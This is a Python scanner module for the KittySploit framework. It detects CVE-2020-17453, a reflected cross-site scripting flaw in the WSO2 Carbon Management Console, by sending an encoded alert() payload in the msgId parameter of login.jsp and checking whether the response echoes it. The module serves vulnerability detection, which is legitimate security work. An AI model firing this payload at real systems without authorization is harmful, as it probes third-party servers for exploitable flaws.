#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WSO2 Management Console through 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting Detection',
        'description': 'WSO2 Management Console through 5.10 is susceptible to reflected cross-site scripting which can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'wso2', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-1132',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-17453',
            'https://twitter.com/JacksonHHax/status/1374681422678519813',
            'https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2021/WSO2-2020-1132/',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-17453',
    }

    def run(self):
        r = self.http_request(method="GET", path='/carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("'';alert('document.domain')//';",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting detected",
                path='/carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F',
            )
            return True
        return False

